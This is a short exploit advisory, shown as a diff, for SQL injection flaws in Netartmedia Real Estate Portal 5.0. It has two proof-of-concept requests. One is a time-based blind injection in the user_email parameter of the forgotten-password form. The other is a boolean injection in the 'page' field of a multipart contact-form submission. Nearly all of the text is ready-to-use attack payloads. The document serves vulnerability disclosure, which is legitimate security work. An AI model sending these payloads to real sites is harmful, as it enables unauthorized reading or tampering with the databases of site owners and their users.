@@ -1,0 +1,58 @@
+# Exploit Title: Netartmedia Real Estate Portal 5.0 - Multiple SQL Injection
+# Date: 19.03.2019
+# Exploit Author: Ahmet Ümit BAYRAM
+# Vendor Homepage: https://www.netartmedia.net/realestate/
+# Demo Site: https://www.phpscriptdemos.com/realestate/
+# Version: 5.0
+# Tested on: Kali Linux
+# CVE: N/A
+# Description: The real estate portal software is made to be
+multi-language, the main site can show multiple languages and let the site
+visitors choose their preferred language.
+
+----- PoC 1: SQLi -----
+
+Request: http://localhost/[PATH]/index.php
+Parameter: user_email (POST)
+Payload:
+ProceedSend=1&mod=forgotten_password&user_email=0'XOR(if(now()=sysdate(),sleep(0),0))XOR'Z'
+OR SLEEP(5)#
+
+----- PoC 2: SQLi -----
+
+Request: http://localhost/[PATH]/index.php
+Parameter: MULTIPART page ((custom) POST
+Payload:
+------WebKitFormBoundaryYUBPFrrBhV4S4pf0
+Content-Disposition: form-data; name="SubmitContact"
+
+1
+------WebKitFormBoundaryYUBPFrrBhV4S4pf0
+Content-Disposition: form-data; name="code"
+
+94102
+------WebKitFormBoundaryYUBPFrrBhV4S4pf0
+Content-Disposition: form-data; name="email"
+
+sample@email.tst
+------WebKitFormBoundaryYUBPFrrBhV4S4pf0
+Content-Disposition: form-data; name="message"
+
+20
+------WebKitFormBoundaryYUBPFrrBhV4S4pf0
+Content-Disposition: form-data; name="name"
+
+${alpharand}
+------WebKitFormBoundaryYUBPFrrBhV4S4pf0
+Content-Disposition: form-data; name="page"
+
+en_Contact-2228' OR 3801=3801-- eISZ
+------WebKitFormBoundaryYUBPFrrBhV4S4pf0
+Content-Disposition: form-data; name="phone"
+
+555-666-0606
+------WebKitFormBoundaryYUBPFrrBhV4S4pf0
+Content-Disposition: form-data; name="subject"
+
+1
+------WebKitFormBoundaryYUBPFrrBhV4S4pf0--
